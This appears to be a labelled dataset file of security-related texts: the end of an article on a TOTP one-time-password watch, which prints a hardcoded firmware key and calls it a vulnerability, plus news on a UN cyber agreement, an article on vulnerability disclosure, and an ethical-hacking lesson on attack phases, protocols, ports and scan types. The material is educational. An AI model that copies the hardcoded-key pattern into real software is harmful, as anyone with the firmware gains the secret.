as alarms and button presses. In addition, the overall operation of the watch is driven through several modes, corresponding to a particular function executed on the watch. These modes are driven through a menu system.\nPhoto 2 shows the watch with its 96-segment liquid crystal display (LCD) and four buttons to control its operation. The left buttons select the mode. The watch has two independent menu systems, one to control the top line of the display and one to control the bottom line. Hence, the overall mode of the watch is determined by a combination of a menu-1 entry and a menu-2 entry.\nPhoto 2—With the watch in TOTP mode, one-time passwords are shown on the second line of the display. In this photo, I am using the one-time password 854410. The watch display cycles through the strings “totP,” “854,” and “410.”\nListing 2 illustrates the code relevant to the TOTP implementation. When the watch is in TOTP mode, the sx button is tied to the function set_totp(). This function initializes the TOTP timestamp value.\nListing 2—Code relevant to the TOTP implementation\nThe function retrieves the current time from the watch and converts it into elapsed seconds using the standard library function mktime. Two adjustments are made to the output of mktime, on line 11 and line 12. The first factor, 2208988800, takes into account that the mktime in the TI library returns the number of seconds since January 1, 1900, while the TOTP standard sets zero time at January 1, 1970. The second factor, 18000, takes into account that my watch is set to Eastern Standard Time (EST), while the TOTP standard assumes the UTC time zone—five hours ahead of EST. Finally, on line 14, the number of seconds is divided by 30 to obtain the standard TOTP timestamp. The TOTP timestamp is further updated every 30 s, through the function tick_totp().\nThe one-time password is calculated by compute_totp on line 33. Rather than writing a SHA1-HMAC from scratch, I ported the open-source implementation from Google Authenticator to the TI MSP 430. Lines 39 through 50 show how a six-digit TOTP code is calculated from the 160-bit digest output of the SHA1-HMAC.\nThe display menu function is display_totp on line 52. The function is called when the watch first enters TOTP mode and every second after that. First, the watch will recompute the one-time password code at the start of each 30-s interval. Next, the TOTP code is displayed. The six digits of the TOTP code are more than can be shown on the bottom line of the watch. Therefore, the watch will cycle between showing “totP,” the first three digits of the one-time password, and the next three digits of the one-time password. The transitions each take 1 s, which is sufficient for a user to read all digits.\nThere is one element missing to display TOTP codes: I did not explain how the unique secret value is loaded into the watch. I use Google Authenticator to generate this secret value and to maintain a copy of it on Google’s servers so that I can use it to log on with TOTP.\nLOGGING ONTO GMAIL\nGoogle Authenticator is an implementation of TOTP developed by Google. It provides an implementation for Android, Blackberry, and IOS so you can use a smartphone as a secure token. In addition, it also enables you to extend your login procedure with a one-time password. You cannot replace your standard password with a one-time password, but you can enable both at the same time. Such a solution is called a two-factor authentication procedure. You need to provide a password and a one-time password to complete the login.\nAs part of setting up the two-factor authentication with Google (through Account Settings – Using Two-Step Verification), you will receive a secret key. The secret key is presented as a 16-character string made up of a 32-character alphabet. The alphabet consists of the letters A through Z and the digits 2, 3, 4, 5, 6, and 7. This clever choice avoids numbers that can confused with letters (8 and B, for example). The 16-character string thus represents an 80-bit key.\nI program this string in the TOTP design for the eZ430-Chronos watch to initialize the secret. In the current implementation, the key is loaded in the function reset_totp().\nbase32_decode((const u8 *)\n”4RGXVQI7YVY4LBPC”, stotp.key, 16);\nOf course, entering the key as a constant string in the firmware is an obvious vulnerability. An attacker who has access to a copy of the firmware also has the secret key used by the TOTP implementation! It’s possible to protect or obfuscate the key from the watch firmware, but these techniques are beyond the scope of this article. Once the key is programmed into the watch and the time is correctly set, you can display TOTP codes that help you complete the logon process of Google. Photo 1 shows a demonstration of logging onto Google’s two-step verification with a one-time password.\nOTHER USES OF TOTP\nThere are other possibilities for one-time passwords. If you are using Linux as your host PC, you can install the OATH Toolkit, which implements the HOTP and TOTP mechanisms for logon. This toolkit enables you to install authentication modules on your PC that can replace the normal login passwords. This enables you to effectively replace the password you need to remember with a password generated from your watch.\nIncidentally, several recent articles—which I have included in the resources section of this article—point to the limits of conventional passwords. New technologies, including one-time passwords and biometrics, provide an interesting alternative. With standards such as those from OATH around the corner, the future may become more secure and user-friendly at the same time.\n[Editor's note: This article originally appeared in Circuit Cellar 262, May 2012.]\nPatrick Schaumont writes the Embedded Security column for Circuit Cellar magazine. He is an Associate Professor in the Bradley Department of Electrical and Computer Engineering at Virginia Tech. Patrick works with his students on research projects in embedded security, covering hardware, firmware, and software.\nTo download the code, go to ftp://ftp.circuitcellar.com/pub/Circuit_Cellar/2012/262.\nGoogle Authenticator, http://code.google.com/p/google-authenticator.\nInitiative for Open Authentication (OATH), www.openauthentication.org.\nInternet Engineering Task Force (IETF), www.ietf.org.\nD. M’Raihi, et al, “TOTP: Time-Based One-Time Password Algorithm,” IETF RFC 6238, 2011.\n—, “HOTP: An HMAC-Based One-Time Password Algorithm,” IETF RFC 4226, 2005.\nOATH Toolkit, www.nongnu.org/oath-toolkit.\nK. Schaffer, “Are Password Requirements Too Difficult?,” IEEE Computer Magazine, 2011.\nS. Sengupta, “Logging in With a Touch or a Phrase (Anything but a Password),” New York Times, 2011.\nIAR Embedded Workbench – IAR Systems\neZ430-Chronos Wireless development system and Code Composer Studio (CCStudio) IDE – Texas Instruments, Inc.", "label": 1}
{"text": "The US, UK, China and Russia are among 15 nations that have agreed to work together to reduce the threat of cyber attacks.\nThe agreement, signed at the UN, represents a significant change in US posture, said Robert Knake, a cyberwarfare expert with the Council on Foreign Relations.\nParticipation of the US demonstrates the Obama administration's strategy of diplomatic engagement, he said.\nThe group has recommended the UN creates norms of accepted behaviour in cyberspace. It should also exchange information on national legislation and cybersecurity strategies, and strengthen the capacity of less-developed countries to protect their computer systems.\nWhen the group last met in 2005, they failed to find common ground. This time, by crafting a short text that left out controversial elements, they were able to reach a consensus.\nIn the past, US efforts to work with other countries in cyberspace have centred on combatting crimes online, but did not deal with issues such as state involvement in or responsibility for cyber intrusions into critical computer systems.\nOthers in the group are France, Germany, Estonia, Belarus, Brazil, India, Israel, Italy, Qatar, South Korea, and South Africa.", "label": 1}
{"text": "Software Vulnerability Disclosure: The Chilling Effect\nHow the Web makes creating software vulnerabilities easier, disclosing them more difficult and discovering them possibly illegal\nJanuary 01, 2007 — CSO —\nLast February at Purdue University, a student taking \"cs390s—Secure Computing\" told his professor, Dr. Pascal Meunier, that a Web application he used for his physics class seemed to contain a serious vulnerability that made the app highly insecure. Such a discovery didn't surprise Meunier. \"It's a secure computing class; naturally students want to discover vulnerabilities.\"\nThey probably want to impress their prof, too, who's a fixture in the vulnerability discovery and disclosure world. Dr. Meunier has created software that interfaces with vulnerability databases. He created ReAssure, a kind of vulnerability playground, a safe computing space to test exploits and perform what Meunier calls \"logically destructive experiments.\" He sits on the board of editors for the Common Vulnerabilities and Exposures (CVE) service, the definitive dictionary of all confirmed software bugs. And he has managed the Vulnerabilities Database and Incident Response Database projects at Purdue's Center for Education and Research in Information and Assurance, or Cerias, an acronym pronounced like the adjective that means \"no joke.\"\nWhen the undergraduate approached Meunier, the professor sensed an educational opportunity and didn't hesitate to get involved. \"We wanted to be good citizens and help prevent the exploit from being used,\" he says. In the context of vulnerable software, it would be the last time Meunier decided to be a good citizen.\nMeunier notified the authors of the physics department application that one of his students—he didn't say which one—had found a suspected flaw, \"and their response was beautiful,\" says Meunier. They found, verified and fixed the bug right away, no questions asked.\nBut two months later, in April, the same physics department website was hacked. A detective approached Meunier, whose name was mentioned by the staff of the vulnerable website during questioning. The detective asked Meunier for the name of the student who had discovered the February vulnerability. The self-described \"stubborn idealist\" Meunier refused to name the student. He didn't believe it was in that student's character to hack the site and, furthermore, he didn't believe the vulnerability the student had discovered, which had been fixed, was even connected to the April hack.\nThe detective pushed him. Meunier recalls in his blog: \"I was quickly threatened with the possibility of court orders, and the number of felony counts in the incident was brandished as justification for revealing the name of the student.\" Meunier's stomach knotted when some of his superiors sided with the detective and asked him to turn over the student. Meunier asked himself: \"Was this worth losing my job? Was this worth the hassle of responding to court orders, subpoenas, and possibly having my computers (work and personal) seized?\" Later, Meunier recast the downward spiral of emotions: \"I was miffed, uneasy, disillusioned.\"", "label": 1}
{"text": "Continuation of Ethical Hacking Basics Class part 1\nThe Transmission Control Protocol/Internet Protocol (TCP/IP) suite is so dominant and important to ethical hacking that it is given wide coverage in this lesson. Many tools, attacks, and techniques that will be covered throughout this class are based on the use and misuse of TCP/IP protocol suite. Understanding its basic functions will advance your security skills. This lesson also spends time reviewing the attackerís process and some of the better known methodologies used by ethical hackers.\nState the process or methodology hackers use to attack networks\nAttackers follow a fixed methodology. To beat a hacker, you have to think like one, so itís important to understand the methodology. The steps a hacker follows can be broadly divided into six phases, which include pre-attack and attack phases:\n- Performing Reconnaissance\n- Scanning and enumeration\n- Gaining access\n- Escalation of privilege\n- Maintaining access\n- Covering tracks and placing backdoors\nA denial of service (DoS) might be included in the preceding steps if the attacker has no success in gaining access to the targeted system or network. Letís look at each of these phases in more detail so that you better understand the steps.\nReconnaissance is considered the first pre-attack phase and is a systematic attempt to locate, gather, identify, and record information about the target. The hacker seeks to find out as much information as possible about the victim. This first step is considered a passive information gathering. As an example, many of you have probably seen a detective movie in which the policeman waits outside a suspectís house all night and then follows him from a distance when he leaves in the car. Thatís reconnaissance; it is passive in nature, and, if done correctly, the victim never even knows it is occurring.\nHackers can gather information in many different ways, and the information they obtain allows them to formulate a plan of attack. Some hackers might dumpster dive to find out more about the victim. Dumpster diving is the act of going through the victimís trash. If the organization does not have good media control policies, many types of sensitive information will probably go directly in the trash. Organizations should inform employees to shred sensitive information or dispose of it in an approved way.\nDonít think that you are secure if you take adequate precautions with paper documents. Another favorite of the hacker is social engineering. A social engineer is a person who can smooth talk other individuals into revealing sensitive information. This might be accomplished by calling the help desk and asking someone to reset a password or by sending an email to an insider telling him he needs to reset an account.\nIf the hacker is still struggling for information, he can turn to what many consider the hackerís most valuable reconnaissance tool, the Internet. Thatís right; the Internet offers the hacker a multitude of possibilities for gathering information. Letís start with the company website. The company website might have key employees listed, technologies used, job listings probably detailing software and hardware types used, and some sites even have databases with employee names and email addresses.\nScanning and enumeration is considered the second pre-attack phase. Scanning is the active step of attempting to connect to systems to elicit a response. Enumeration is used to gather more in-depth information about the target, such as open shares and user account information. At this step in the methodology, the hacker is moving from passive information gathering to active information gathering. Hackers begin injecting packets into the network and might start using scanning tools such as Nmap. The goal is to map open ports and applications. The hacker might use techniques to lessen the chance that he will be detected by scanning at a very slow rate. As an example, instead of checking for all potential applications in just a few minutes, the scan might take days to verify what applications are running. Many organizations use intrusion detection systems(IDS) to detect just this type of activity. Donít think that the hacker will be content with just mapping open ports. He will soon turn his attention to grabbing banners. He will want to get a good idea of what type of version of software applications you are running. And, he will keep a sharp eye out for down-level software and applications that have known vulnerabilities. An example of down-level software would be Windows 95.\nOne key defense against the hacker is the practice of deny all. The practice of the deny all rule can help reduce the effectiveness of the hackerís activities at this step. Deny all means that all ports and applications are turned off, and only the minimum number of applications and services are turned on that are needed to accomplish the organizationís goals.\nUnlike the elite black hat hacker who attempts to remain stealth, script kiddies might even use vulnerability scanners such as Nessus to scan a victimís network. Although the activities of the black hat hacker can be seen as a single shot in the night, the script kiddies scan will appear as a series of shotgun blasts, as their activity will be loud and detectable. Programs such as Nessus are designed to find vulnerabilities but are not designed to be a hacking tool; as such, they generate a large amount of detectable network traffic.\nThe greatest disadvantage of vulnerability scanners is that they are very noisy.\nAs far as potential damage, this could be considered one of the most important steps of an attack. This phase of the attack occurs when the hacker moves from simply probing the network to actually attacking it. After the hacker has gained access, he can begin to move from system to system, spreading his damage as he progresses.\nAccess can be achieved in many different ways. A hacker might find an open wireless access point that allows him a direct connection or the help desk might have given him the phone number for a modem used for out-of-band management. Access could be gained by finding a vulnerability in the web serverís software. If the hacker is really bold, he might even walk in and tell the receptionist that he is late for a meeting and will wait in the conference room with network access. Pity the poor receptionist who unknowingly provided network access to a malicious hacker. These things do happen to the company that has failed to establish good security practices and procedures.\nThe factors that determine the method a hacker uses to access the network ultimately comes down to his skill level, amount of access he achieves, network architecture, and configuration of the victimís network.\nAlthough the hacker is probably happy that he has access, donít expect him to stop what he is doing with only a ďJoe userĒ account. Just having the access of an average user probably wonít give him much control or access to the network. Therefore, the attacker will attempt to escalate himself to administrator or root privilege. After all, these are the individuals who control the network, and that is the type of power the hacker seeks.\nPrivilege escalation can best be described as the act of leveraging a bug or vulnerability in an application or operating system to gain access to resources that normally would have been protected from an average user. The end result of privilege escalation is that the application performs actions that are running within a higher security context than intended by the designer, and the hacker is granted full access and control.\nWould you believe that hackers are paranoid people? Well, many are, and they worry that their evil deeds might be uncovered. They are diligent at working on ways to maintain access to the systems they have attacked and compromised. They might attempt to pull down the etc/passwd file or steal other passwords so that they can access other userís accounts.\nRootkits are one option for hackers. A rootkit is a set of tools used to help the attacker maintain his access to the system and use it for malicious purposes. Rootkits have the capability to mask the hacker, hide his presence, and keep his activity secret. They will be discussed in detail later on in the class.\nSometimes hackers might even fix the original problem that they used to gain access, where they can keep the system to themselves. After all, who wants other hackers around to spoil the fun? Sniffers are yet another option for the hacker and can be used to monitor the activity of legitimate users. At this point, hackers are free to upload, download, or manipulate data as they see fit.\nNothing happens in a void, and that includes computer crime. Hackers are much like other criminals in that they would like to be sure to remove all evidence of their activities. This might include using rootkits or other tools to cover their tracks. Other hackers might hunt down log files and attempt to alter or erase them.\nHackers must also be worried about the files or programs they leave on the compromised system. File hiding techniques, such as hidden directories, hidden attributes, and Alternate Data Streams (ADS), can be used. As an ethical hacker, you will need to be aware of these tools and techniques to discover their activities and to deploy adequate countermeasures.\nBackdoors are methods that the hacker can use to reenter the computer at will. The tools and techniques used to perform such activities are discussed later on in the class. At this point, what is important is to identify the steps.\nAs an ethical hacker, you will follow a similar process to one that an attacker uses. The stages you progress through will map closely to those the hacker uses, but you will work with the permission of the company and will strive to ďdo no harm.Ē By ethical hacking and assessing the organizations strengths and weaknesses, you will perform an important service in helping secure the organization. The ethical hacker plays a key role in the security process. The methodology used to secure an organization can be broken down into five key steps. Ethical hacking is addressed in the first:\nEthical hacking, penetration testing, and hands-on security tests.\n- Policy Development\nDevelopment of policy based on the organizationís goals and mission. The focus should be on the organizationís critical assets.\nThe building of technical, operational, and managerial controls to secure key assets and data.\nEmployees need to be trained as to how to follow policy and how to configure key security controls, such as Intrusion Detection Systems (IDS) and firewalls.\nAuditing involves periodic reviews of the controls that have been put in place to provide good security. Regulations such as Health Insurance Portability and Accountability Act (HIPAA) specify that this should be done yearly.\nAll hacking basically follows the same six-step methodology discussed in the previous section: reconnaissance, scanning and enumeration, gaining access, escalation of privilege, maintaining access, and covering tracks and placing backdoors.\nIs this all you need to know about methodologies? No, different organizations have developed diverse ways to address security testing. There are some basic variations you should be aware of. These include National Institute of Standards and Technology 800-42, Threat and Risk Assessment Working Guide, Operational Critical Threat, Asset, fand Vulnerability Evaluation, and Open Source Security Testing Methodology Manual. Each is discussed next.\nThe NIST 800-42 method of security assessment is broken down into four basic stages that Include:\nNIST has developed many standards and practices for good security. This methodology is contained in NIST 800-42. This is just one of several documents available to help guide you through an assessment. Find out more at http://csrc.nist.gov/publications/nistpubs.\nThe Threat and Risk Assessment Working Guide provides guidance to individuals or teams carrying out a Threat and Risk Assessment (TRA) for an existing or proposed IT system. This document helps provide IT security guidance and helps the user determine which critical assets are most at risk within that system and develop recommendations for safeguards. Find out more at http://www.cse-cst.gc.ca/publication.../itsg04-e.html.\nOCTAVE focuses on organizational risk and strategic, practice-related issues. OCTAVE is driven by operational risk and security practices. OCTAVE is self-directed by a small team of people from the organizationís operational, business units, and the IT department. The goal of OCTAVE is to get departments to work together to address the security needs of the organization. The team uses the experience of existing employees to define security, identify risks, and build a robust security strategy. Find out more at www.cert.org/octave.\nOne well-known open sourced methodology is the OSSTMM. The OSSTMM divides security assessment into six key points known as sections. They are as follows:\n* Physical Security\n* Internet Security\n* Information Security\n* Wireless Security\n* Communications Security\n* Social Engineering\nThe OSSTMM gives metrics and guidelines as to how many man-hours a particular assessment will require. Anyone serious about learning more about security assessment should review this documentation. The OSSTMM outlines what to do before, during, and after a security test. Find out more at www.isecom.org/osstmm.\nTo really understand many of the techniques and tools that hackers use, you need to understand how systems and devices communicate. Hackers understand this, and many think outside the box when planning an attack or developing a hacking tool. As an example, TCP uses flags to communicate, but what if a hacker sends TCP packets with no flags set? Sure, it breaks the rules of the protocol, but it might allow the attacker to illicit a response to help identify the server. As you can see, having the ability to know how a protocol, service, or application works and how it can be manipulated can be beneficial.\nThe OSI model and TCP/IP are discussed in the next sections. Pay careful attention to the function of each layer of the stack, and think about what role each layer plays in the communication process.\nUnderstand the Open Systems Interconnect (OSI) Model\nOnce upon a time, the world of network protocols was much like the Wild West. Everyone kind of did their own thing, and if there were trouble, there would be a shoot-out on Main Street. Trouble was, you never knew whether you were going to get hit by a stray bullet. Luckily, the IT equivalent of the sheriff came to town. This was the International Standards Organization (ISO). The ISO was convinced that there needed to be order and developed the Open Systems Interconnect (OSI) model in 1984. The model is designed to provide order by specifying a specific hierarchy in which each layer builds on the output of each adjacent layer. Although its role as sheriff was not widely accepted by all, the model is still used today as a guide to describe the operation of a networking environment.\nThere are seven layers of the OSI model: the Application, Presentation, Session, Transport, Network, Data Link, and Physical layers. The seven layers of the OSI model are shown in Figure 2.1, which overviews data moving between two systems up and down the stack, and described in the following list:\nLayer 7 is known as the Application layer. Recognized as the top layer of the OSI model, this layer serves as the window for application services. The Application layer is one that most users are familiar with as it is the home of email programs, FTP, Telnet, web browsers, and office productivity suites, as well as many other applications. It is also the home of many malicious programs such as viruses, worms, Trojan horse programs, and other virulent applications.Presentation layer\nLayer 6 is known as the Presentation layer. The Presentation layer is responsible for taking data that has been passed up from lower levels and putting it into a format that Application layer programs can understand. These common formats include American Standard Code for Information Interchange (ASCII), Extended Binary-Coded Decimal Interchange Code (EBCDIC), and American National Standards Institute (ANSI). From a security standpoint, the most critical process handled at this layer is encryption and decryption. If properly implemented, this can help security data in transit.Session layer\nLayer 5 is known as the Session layer. Its functionality is put to use when creating, controlling, or shutting down a TCP session. Items such as the TCP connection establishment and TCP connection occur here. Session-layer protocols include items such as Remote Procedure Call and SQLNet from Oracle. From a security standpoint, the Session layer is vulnerable to attacks such as session hijacking. A session hijack can occur when a legitimate user has his session stolen by a hacker. This will be discussed in detail in lesson 7, \"Sniffers, Session Hijacking, and Denial of Service \".Transport layer\nLayer 4 is known as the Transport layer. The Transport layer ensures completeness by handling end-to-end error recovery and flow control. Transport-layer protocols include TCP, a connection-oriented protocol. TCP provides reliable communication through the use of handshaking, acknowledgments, error detection, and session teardown, as well as User Datagram Protocol (UDP), a connectionless protocol. UDP offers speed and low overhead as its primary advantage. Security concerns at the transport level include Synchronize(SYN) attacks, Denial of Service(DoS), and buffer overflows.Network layer\nLayer 3 is known as the Network layer. This layer is concerned with logical addressing and routing. The Network layer is the home of the Internet Protocol (IP), which makes a best effort at delivery of datagrams from their source to their destination. Security concerns at the network level include route poisoning, DoS, spoofing, and fragmentation attacks. Fragmentation attacks occur when hackers manipulate datagram fragments to overlap in such a way to crash the victimís computer. IPSec is a key security service that is available at this layer.Data Link layer\nLayer 2 is known as the Data Link layer. The Data Link layer is responsible for formatting and organizing the data before sending it to the Physical layer. The Data Link layer organizes the data into frames. A frameis a logical structure in which data can be placed; itís a packet on the wire. When a frame reaches the target device, the Data Link layer is responsible for stripping off the data frame and passing the data packet up to the Network layer. The Data Link layer is made up of two sub layers, including the logical link control layer (LLC) and the media access control layer (MAC). You might be familiar with the MAC layer, as it shares its name with the MAC addressing scheme. These 6-byte (48-bit) addresses are used to uniquely identify each device on the local network. A major security concern of the Data Link layer is the Address Resolution Protocol (ARP) process. ARP is used to resolve known Network layer addresses to unknown MAC addresses. ARP is a trusting protocol and, as such, can be used by hackers for APR poisoning, which can allow them access to traffic on switches they should not have.Physical layer\nLayer 1 is known as the Physical layer. At Layer 1, bit-level communication takes place. The bits have no defined meaning on the wire, but the Physical layer defines how long each bit lasts and how it is transmitted and received. From a security standpoint, you must be concerned anytime a hacker can get physical access. By accessing a physical component of a computer networkósuch as a computer, switch, or cableóthe attacker might be able to use a hardware or software packet snifferto monitor traffic on that network. Sniffers enable attacks to capture and decode packets. If no encryption is being used, a great deal of sensitive information might be directly available to the hacker.TIP\nFor the exam, make sure that you know which attacks and defenses are located on each layer.\nHave a basic knowledge of the Transmission Control Protocol/Internet Protocol (TCP/IP) and their functionality Describe the basic TCP/IP frame structure\nFour main protocols form the core of TCP/IP: the Internet Protocol (IP), the Transmission Control Protocol (TCP), the User Datagram Protocol (UDP), and the Internet Control Message Protocol (ICMP). These protocols are essential components that must be supported by every device that communicates on a TCP/IP network. Each serves a distinct purpose and is worthy of further discussion. The four layers of the TCP/IP stack are shown in Figure 2.2. The figure lists the Application, Host-to-host, Internet, and Network Access layers and describes the function of each.\nTCP/IP is the foundation of all modern networks. In many ways, you can say that TCP/IP has grown up along with the development of the Internet. Its history can be traced back to standards adopted by the U.S. governmentís Department of Defense (DoD) in 1982. Originally, the TCP/IP model was developed as a flexible, fault tolerant set of protocols that were robust enough to avoid failure should one or more nodes go down. After all, the network was designed to these specifications to withstand a nuclear strike, which might destroy key routing nodes. The designers of this original network never envisioned the Internet we use today. Because TCP/IP was designed to work in a trusted environment, many TCP/IP protocols are now considered insecure. As an example, Telnet is designed to mask the password on the userís screen, as the designers didnít want shoulder surfers stealing a password; however, the password is sent in clear text on the wire. Little concern was ever given to the fact that an untrustworthy party might have access to the wire and be able to sniff the clear text password. Most networks today run TCP/IPv4. Many security mechanisms in TCP/IPv4 are add-ons to the original protocol suite. As the layers are stacked one atop another, encapsulation takes place. Encapsulation is the technique of layering protocols in which one layer adds a header to the information from the layer above. An example of this can be seen in Figure 2.3. This screenshot from a sniffer program has UDP highlighted.\nA lot of free packet sniffing utilities are available on the Internet. Consider evaluating Packetyzer for Windows or Ethereal for Linux. There are also many commercial sniffing tools, such as Sniffer by Network General. These tools can help you learn more about encapsulation and packet structure.\nLetís take a look at each of the four layers of TCP/IP and discuss some of the security concerns lassociated with each layer and specific protocols. The four layers of TCP/IP include\n- The Application layer\n- The Host-to-host layer\n- The Internet layer\n- The Network access layer\nDescribe application ports and how they are numbered The Application layer sets at the top of the protocol stack. This layer is responsible for application support. Applications are typically mapped not by name, but by their corresponding port. Ports are placed into TCP and UDP packets so that the correct application can be passed to the required protocols below.\nAlthough a particular service might have an assigned port, nothing specifies that services cannot listen on another port. A common example of this is Simple Mail Transfer Protocol (SMTP). The assigned port of this is 25. Your cable company might block port 25 in an attempt to keep you from running a mail server on your local computer; however, nothing prevents you from running your mail server on another local port. The primary reason services have assigned ports is so that a client can easily find that service on a remote host. As an example, FTP servers listen at port 21, and Hypertext Transfer Protocol (HTTP) servers listen at port 80. Client applications, such as a File Transfer Protocol (FTP) program or browser, use randomly assigned ports typically greater than 1023.\nThere are approximately 65,000 ports; they are divided into well-known ports (0Ė1023), registered ports (1024Ė49151), and dynamic ports (49152Ė65535). Although there are hundreds of ports and corresponding applications in practice, less than a hundred are in common use. The most common of these are shown in Table 2.1. These are some of the ports that a hacker would look for first on a victimís computer systems.\nTABLE 2.1 Common Ports and Protocols\nPort Service Protocol 21 FTP TCP 22 SSH TCP 23 Telnet TCP 25 SMTP TCP 53 DNS TCP/UDP 67/68 DHCP UDP 69 TFTP UDP 79 Finger TCP 80 HTTP TCP 88 Kerberos UDP 110 POP3 TCP 111 SUNRPC TCP/UDP 135 MS RPC TCP/UDP 139 NB Session TCP/UDP 161 SNMP UDP 162 SNMP Trap UDP 389 LDAP TCP 443 SSL TCP 445 SMB over IP TCP/UDP 1433 MS-SQL TCP\nThe following list discusses the operation and security issues of some of the common applications:\nFile Transfer Protocol (FTP)\nFTP is a TCP service and operates on ports 20 and 21. This application is used to move files from one computer to another. Port 20 is used for the data stream and transfers the data between the client and the server. Port 21 is the control stream and is used to pass commands between the client and the FTP server. Attacks on FTP target misconfigured directory permissions and compromised or sniffed clear-text passwords. FTP is one of the most commonly hacked services.Telnet\nTelnet is a TCP service that operates on port 23. Telnet enables a client at one site to establish a session with a host at another site. The program passes the information typed at the clientís keyboard to the host computer system. Although Telnet can be configured to allow anonymous connections, it should be configured to require usernames and passwords. Unfortunately, even then, Telnet sends them in clear text. When a user is logged in, he or she can perform any allowed task. Applications, such as Secure Shell (SSH), should be considered as a replacement. SSH is a secure replacement for Telnet and does not pass cleartext username and passwords.Simple Mail Transfer Protocol (SMTP)\nThis application is a TCP service that operates on port 25. It is designed for the exchange of electronic mail between networked systems. Messages sent through SMTP have two parts: an address header and the message text. All types of computers can exchange messages with SMTP. Spoofing and spamming are two of the vulnerabilities associated with SMTP.Domain Name Service (DNS)\nThis application operates on port 53 and performs address translation. Although we sometimes realize the role DNS plays, it serves a critical function in that it converts fully qualified domain names (FQDNs) into a numeric IP address or IP addresses into FQDNs. If someone were to bring down DNS, the Internet would continue to function, but it would require that Internet users know the IP address of every site they want to visit. For all practical purposes, the Internet would not be useable without DNS.The DNS database consists of one or more zone files. Each zone is a collection of structured resource records. Common record types include the Start of Authority(SOA) record, A record, CNAME record, NS record, PTR record, and the MX record. There is only one SOA record in each zone database file. It describes the zone name space. The A record is the most common, as it contains IP addresses and names of specific hosts. The CNAME record is an alias. For example, the outlaw William H. Bonney went by the alias of Billy the Kid. The NS record lists the IP address of other name servers. An MX recordis a mail exchange record. This record has the IP address of the server where email should be delivered. Hackers can target DNS servers with many types of attacks. One such attack is DNS cache poisoning. This type of attack sends fake entries to a DNS server to corrupt the information stored there. DNS can also be susceptible to DoS attacks and to unauthorized zone transfers. DNS uses UDP for DNS queries and TCP for zone transfers.\nTrivial File Transfer Protocol (TFTP)\nTFTP operates on port 69. It is considered a down-and-dirty version of FTP as it uses UDP to cut down on overhead. It not only does so without the session management offered by TCP, but it also requires no authentication, which could pose a big security risk. It is used to transfer router configuration files and by cable companies to configure cable modems. TFTP is a favorite of hackers and has been used by programs, such as the Nimda worm, to move data without having to use input usernames or passwords.Hypertext Transfer Protocol (HTTP)\nHTTP is a TCP service that operates on port 80. This is one of the most well-known applications. HTTP has helped make the Web the popular protocol it is today. The HTTP connection model is known as a stateless connection. HTTP uses a request response protocol in which a client sends a request and a server sends a response. Attacks that exploit HTTP can target the server, browser, or scripts that run on the browser. Code Red is an example of code that targeted a web server.Simple Network Management Protocol(SNMP)\nSNMP is a UDP service and operates on ports 161 and 162. It was envisioned to be an efficient and inexpensive way to monitor networks. The SNMP protocol allows agents to gather information, including network statistics, and report back to their management stations. Most large corporations have implemented some type of SNMP management. Some of the security problems that plague SNMP are caused by the fact that community strings can be passed as clear text and that the default community strings (public/private) are well known. SNMP version 3 is the most current, and it offers encryption for more robust security.TIP\nA basic understanding of these applicationsí strengths and weaknesses will be needed for the exam.\nDescribe the TCP packet structure\nKnow the TCP flags and their meaning\nUnderstand how UDP differs from TCP\nThe host-to-host layer provides end-to-end delivery. Two primary protocols are located at the host-to-host layer, which includes Transmission Control Protocol (TCP) and User Datagram Protocol (UDP).\nTCP enables two hosts to establish a connection and exchange data reliably. To do this, TCP performs a three-step handshake before data is sent. During the data-transmission process, TCP guarantees delivery of data by using sequence and acknowledgment numbers. At the completion of the data-transmission process, TCP performs a four-step shutdown that gracefully concludes the session. The startup and shutdown sequences are shown in Figure 2.4.\nTCP has a fixed packet structure that is used to provide flow control, maintain reliable communication, and ensure that any missing data is resent. At the heart of TCP is a 1-byte flag field. Flags help control the TCP process. Common flags include synchronize (SYN), acknowledgement (ACK), push (PSH), and finish (FIN). Figure 2.5 details the TCP packet structure. TCP security issues include TCP sequence number attacks, session hijacking, and SYN flood attacks. Programs, such as Nmap, manipulate TCP flags to attempt to identify active hosts.\nThe ports shown previously in Table 2.1 identify the source and target application, whereas the sequence and acknowledgement numbers are used to assemble packets into their proper order. The flags are used to manage TCP sessionsófor example, the synchronize (SYN) and acknowledge (ACK) flags are used in the three-way handshaking, whereas the reset (RST) and finish (FIN) flags are used to tear down a connection. FIN is used during a normal four-step shutdown, whereas RST is used to signal the end of an abnormal session. The checksum is used to ensure that the data is correct, although an attacker can alter a TCP packet and the checksum to make it appear valid. Other flags include urgent (URG). If no flags are set at all, the flags can be referred to as Null, as none are set.\nNot all hacking tools play by the rules; most port scanners can tweak TCP flags and send them in packets that should not normally exist in an attempt to illicit a response for the victimís server. One such variation is the XMAS tree scan, which sets the SYN, URG, and PSH flags. Another is the NULL scan, which sets no flags in the TCP header.\nUDP performs none of the handshaking processes that we see performed with TCP. Although that makes it considerably less reliable than TCP, it does offer the benefit of speed. It is ideally suited for data that requires fast delivery and is not sensitive to packet loss. UDP is used by services such as DHCP and DNS. UDP is easier to spoof by attackers than TCP as it does not use sequence and acknowledgement numbers. Figure 2.6 shows the packet structure of UDP.\nDescribe how Internet Control Message Protocol (ICMP) functions and its purpose\nThe Internet layer contains two important protocols: Internet Protocol (IP) and Internet Control Messaging Protocol (ICMP). IP is a routable protocol whose function is to make a best effort at delivery. The IP header is shown in Figure 2.7. Spend a few minutes reviewing it to better understand each fieldís purpose and structure. While reviewing the structure of UDP, TCP, and IP, packets might not be the most exciting part of security work. A basic understanding is desirable because many attacks are based on manipulation of the packets. For example, the total length field and fragmentation is tweaked in a ping of death attack.\nIP addresses are laid out in a dotted decimal notation format. IPv4 lays out addresses into a four decimal number format that is separated by decimal points. Each of these decimal numbers is one byte in length to allow numbers to range from 0Ė255. Table 2.2 shows IPv4 addresses and the number of available networks and hosts.\nTABLE 2.2 Ipv4 Addressing\nAddress Class | Address Range | Number of Networks | Number of Hosts A 1-126 126 16,777,214 B 128-191 16,384 65,534 C 192-223 2,097152 254 D 224-239 NA NA E 240-255 NA NA\nTABLE 2.3 Private Address Ranges\nAddress Class Address Range Default Subnet Mask A 10.0.0.0 - 10.255.255.255.255 255.0.0.0 B 172.16.0.0 - 172.31.255.255 255.255.0.0 C 192.168.0.0 - 192.168.255.255 255.255.255.0\nSource routing was designed to allow individuals the ability to specify the route that a packet should take through a network. It allows the user to bypass network problems or congestion. IPís source routing informs routers not to use their normal routes for delivery of the packet but to send it via the router identified in the packetís header. This lets a hacker use another systemís IP address and get packets returned to him regardless of what routes are in between him and the destination. This type of 